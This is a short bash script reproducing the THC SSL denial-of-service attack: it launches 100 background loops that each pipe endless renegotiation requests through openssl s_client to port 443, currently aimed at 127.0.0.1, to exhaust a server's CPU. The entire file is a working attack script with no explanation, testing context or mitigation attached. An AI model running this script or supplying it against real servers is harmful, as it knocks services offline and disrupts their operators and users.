#!/bin/bash

thc-ssl-dosit()
{
    while :;
    do
        (while :; do echo R; done) | openssl s_client -connect 127.0.0.1:443 2>/dev/null;
    done
}

for x in `seq 1 100`;
do thc-ssl-dosit &
done
